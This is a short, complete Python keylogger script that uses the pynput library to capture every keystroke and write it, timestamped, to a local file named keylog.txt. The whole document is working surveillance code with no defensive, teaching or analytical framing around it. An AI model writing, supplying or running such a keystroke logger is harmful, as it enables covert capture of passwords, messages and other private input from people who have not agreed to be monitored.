from pynput.keyboard import Key, Listener
import logging

location = "" 

logging.basicConfig(filename=(location+"keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(Key):
    logging.info(Key)

with Listener(on_press=on_press) as listener:
    listener.join()